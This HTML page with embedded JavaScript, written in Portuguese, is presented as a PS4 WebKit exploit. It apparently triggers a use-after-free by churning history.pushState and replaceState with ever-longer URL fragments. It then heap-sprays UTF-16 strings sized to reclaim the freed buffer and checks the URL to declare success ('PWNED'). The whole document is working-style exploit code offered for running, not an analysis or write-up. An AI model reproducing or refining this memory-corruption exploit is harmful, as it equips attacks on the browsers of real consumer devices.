<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - UTF-16 Alignment Spray</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { padding: 15px; width: 100%; font-weight: bold; background: #222; color: #fff; border: 2px solid #0f0; cursor: pointer; }
    #log { border-top: 1px solid #555; margin-top: 20px; padding-top: 10px; white-space: pre-wrap; }
    .success { color: #0ff; font-weight: bold; font-size: 1.2em; }
</style>
</head>
<body>
<h2>PS4 WebKit - UTF-16 Geometry Match</h2>
<div id="status">Pronto</div>
<button onclick="runUtf16Exploit()">INICIAR SPRAY (DIVIDIDO POR 2)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runUtf16Exploit() {
    logEl.innerHTML = "";
    keepAlive = []; 

    // === FASE 1: TRIGGER UAF ===
    statusEl.innerText = "1. Abrindo buraco (UAF)...";
    log("Disparando UAF para criar o buraco de ~340KB...");
    
    let size = 977;
    const STEP = 14461;
    let finalSize = 0;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        finalSize = size;
        size += STEP;
        await sleep(5);
    }
    
    log(`Tamanho do Buraco (Alvo): ${finalSize} bytes`);
    await sleep(50);
    
    // === FASE 2: SPRAY UTF-16 (METADE DO TAMANHO) ===
    statusEl.innerText = "2. Spraying UTF-16 Strings...";
    
    // AQUI ESTÁ A CORREÇÃO:
    // Como o WebKit converte para UTF-16 (2 bytes), dividimos o alvo por 2.
    // Subtraímos um pequeno overhead de header (aprox 24 bytes / 2 = 12 chars)
    const CHARS_NEEDED = Math.floor(finalSize / 2);
    
    log(`Estratégia: Enviar ${CHARS_NEEDED} chars.`);
    log(`Cálculo: ${CHARS_NEEDED} * 2 bytes = ~${finalSize} bytes (Encaixe Perfeito)`);

    // Spray Shotgun: Variação de -100 a +100 caracteres para compensar headers
    for(let delta = -100; delta <= 100; delta += 2) {
        let len = CHARS_NEEDED + delta;
        
        // Criamos strings usando "W"
        for(let k=0; k<10; k++) {
            // Prefixo curto para unicidade
            let prefix = "id" + k; 
            let body = "W".repeat(len - prefix.length);
            keepAlive.push(prefix + body);
        }
    }

    log(`Spray concluído. ${keepAlive.length} strings criadas.`);
    await sleep(200);

    // === FASE 3: VERIFICAÇÃO ===
    statusEl.innerText = "3. Checando URL...";
    let url = document.URL;
    let wCount = 0;
    
    // Varredura rápida
    for(let i=0; i < 2000; i++) {
        if(url[i] === 'W') wCount++;
    }

    if(wCount > 50) {
        log("!!! JACKPOT !!!", "success");
        log("A memória foi reclamada! O 'W' apareceu na URL.");
        log("Agora você tem CONTROLE TOTAL do conteúdo do buffer.");
        statusEl.innerText = "PWNED: UTF-16 RECLAIM";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("Diagnóstico: Tente aumentar o range do loop (+/- 500).");
    }
}
</script>
</body>
</html>
